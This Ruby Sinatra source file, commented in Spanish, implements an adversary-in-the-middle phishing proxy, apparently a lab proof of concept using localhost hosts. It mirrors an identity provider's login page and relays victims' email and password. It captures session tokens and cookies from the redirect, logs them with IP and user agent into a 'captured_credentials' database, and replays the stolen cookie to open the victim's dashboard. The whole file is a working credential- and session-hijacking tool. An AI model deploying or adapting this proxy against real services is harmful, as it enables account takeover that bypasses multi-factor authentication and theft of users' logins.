#!/usr/bin/env ruby
#----------------------------------
#       PROXY - AiTM (Adversary-in-the-Middle)
#----------------------------------

# Requerimos las librerías necesarias para la lógica del proxy.
require 'sinatra/base'      # Framework web
require 'sinatra/contrib'   # Extensiones para Sinatra
require 'sequel'            # ORM para SQLite
require 'sqlite3'           # Driver de SQLite
require 'dotenv/load'       # Carga variables de entorno desde .env
require 'uri'               # Construcción/parsing de URIs
require 'net/http'          # Cliente HTTP nativo de Ruby

# Conexión a la base de datos local donde se almacenan credenciales capturadas.
PROXY_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

# Definición de la tabla (se crea si no existe).
PROXY_DB.create_table?(:captured_credentials) do
  primary_key :id
  String   :email
  String   :token
  String   :ip
  String   :user_agent
  String   :session_cookie
  DateTime :captured_at
end

# URLs configurables: permiten cambiar el IdP o la URL pública del proxy.
IDP_URL   = ENV['IDP_URL']   || 'http://localhost:4444'
PROXY_URL = ENV['PROXY_URL'] || 'http://localhost:4445'

class AvatarProxy < Sinatra::Base
  # Configuración de sesiones con cookie firmada (secret hardcodeado para PoC).
  use Rack::Session::Cookie,
      key: "proxy_session",
      secret: "proxy_vaatu_secret_future_industries_poc_2024_long_enough_string"

  # Carpeta pública para servir CSS/archivos estáticos.
  set :public_folder, File.join(__dir__, '..', 'public')
  set :static, true

  # Helper: reescribe en el HTML cualquier referencia al IdP para que pase por el proxy.
  helpers do
    def rewrite_html(html)
      # Reemplaza la URL del IdP por la del proxy para que links/form actions apunten al proxy.
      html.gsub(IDP_URL, PROXY_URL)
          .gsub("localhost:4444", "localhost:4445")
    end
  end

  # Redirige la raíz al login del proxy.
  get "/" do
    redirect "/login"
  end

  # GET /login: obtiene el HTML de login del IdP y lo reescribe para que pase por el proxy.
  get "/login" do
    uri = URI("#{IDP_URL}/login")
    response = Net::HTTP.get_response(uri)
    content_type 'text/html'
    rewrite_html(response.body)
  end

  # POST /login: envía las credenciales al IdP sin seguir redirects automáticos
  # para capturar el token y la cookie cuando IdP hace el redirect (302/303).
  post "/login" do
    email    = params[:email].to_s.downcase.strip
    password = params[:password].to_s

    puts "Proxy: Received login attempt for #{email}"

    # Net::HTTP no sigue redirects automáticamente — útil para capturar Location/Set-Cookie.
    uri = URI("#{IDP_URL}/login")
    req = Net::HTTP::Post.new(uri)
    req['Content-Type'] = 'application/x-www-form-urlencoded'
    req['User-Agent']       = request.user_agent if request.user_agent
    req['Accept']           = request.env['HTTP_ACCEPT'] if request.env['HTTP_ACCEPT']
    req['Accept-Language']  = request.env['HTTP_ACCEPT_LANGUAGE'] if request.env['HTTP_ACCEPT_LANGUAGE']

    # Codifica los parámetros del formulario en el cuerpo de la petición.
    req.body = URI.encode_www_form({
      email:    email,
      password: password
    })

    http          = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl  = (uri.scheme == 'https')
    idp_response  = http.request(req)

    # Logging del estado y cabeceras recibidas del IdP.
    puts "Proxy: IdP response status: #{idp_response.code}"
    puts "Proxy: IdP response headers: #{idp_response.to_hash}"

    # Tratamos cualquier 3xx como redirect (IdP puede responder 302 o 303 según implementación).
    if idp_response.code.start_with?("3")
      location       = idp_response['location']
      token          = location.match(/token=(.+)/)[1] rescue nil
      raw_cookie     = idp_response['set-cookie']
      session_cookie = raw_cookie.split(';').first rescue nil

      puts "Proxy: Token captured: #{token}"
      puts "Proxy: Cookie captured: #{session_cookie}"

      if token && session_cookie
        # Inserta el registro en la DB de capturas.
        PROXY_DB[:captured_credentials].insert(
          email:          email,
          token:          token,
          ip:             request.ip,
          user_agent:     request.user_agent,
          session_cookie: session_cookie,
          captured_at:    Time.now
        )

        # Guardamos estado en sesión del proxy para permitir dashboard privado.
        session[:user]       = email
        session[:token]      = token
        session[:idp_cookie] = session_cookie

        redirect "/dashboard"
      else
        puts "Proxy: Token or cookie not found"
        content_type 'text/html'
        rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
      end
    else
      # Si IdP no retornó redirect, mostramos el formulario de login otra vez.
      puts "Proxy: IDP did not return 302, showing login again"
      content_type 'text/html'
      rewrite_html(Net::HTTP.get(URI("#{IDP_URL}/login")))
    end
  end

  # Dashboard del proxy: reenvía la petición al IdP usando la cookie capturada.
  get "/dashboard" do
    halt 401, "Not authorized" unless session[:user]

    uri = URI("#{IDP_URL}/dashboard")
    req = Net::HTTP::Get.new(uri)
    req['Cookie'] = session[:idp_cookie]

    http         = Net::HTTP.new(uri.host, uri.port)
    idp_response = http.request(req)

    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  # Logout: borra la sesión del proxy y vuelve al login.
  get "/logout" do
    session.clear
    redirect "/login"
  end
end